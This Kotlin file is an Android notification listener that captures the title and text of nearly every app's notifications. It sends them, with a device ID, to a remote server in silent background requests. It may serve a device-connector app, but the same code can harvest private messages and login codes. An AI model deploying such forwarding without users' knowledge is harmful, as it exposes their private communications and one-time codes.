package com.kztutorial99.androidconnector

import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class NotificationMonitor : NotificationListenerService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON = "application/json; charset=utf-8".toMediaType()

    // Package yang diabaikan (sistem & app kita sendiri)
    private val ignoredPackages = setOf(
        packageName,
        "android",
        "com.android.systemui",
        "com.android.launcher",
        "com.android.launcher3",
        "com.vivo.launcher",
    )

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val sbn = sbn ?: return
        if (sbn.packageName in ignoredPackages) return

        try {
            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text  = extras.getCharSequence("android.text")?.toString()
                ?: extras.getCharSequence("android.bigText")?.toString() ?: ""

            if (title.isBlank() && text.isBlank()) return

            val appName = try {
                val pm = packageManager
                pm.getApplicationLabel(
                    pm.getApplicationInfo(sbn.packageName, PackageManager.GET_META_DATA)
                ).toString()
            } catch (_: Exception) { sbn.packageName }

            val prefs = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
            val deviceId = prefs.getString("device_id", "") ?: return

            val body = JsonObject().apply {
                addProperty("deviceId",    deviceId)
                addProperty("appPackage", sbn.packageName)
                addProperty("appName",    appName)
                addProperty("title",      title)
                addProperty("text",       text)
            }

            Thread {
                try {
                    http.newCall(
                        Request.Builder()
                            .url("${SecureConfig.serverUrl()}/api/device/notifications")
                            .post(body.toString().toRequestBody(JSON))
                            .build()
                    ).execute().close()
                } catch (_: Exception) {}
            }.also { it.isDaemon = true }.start()

        } catch (_: Exception) {}
    }
}
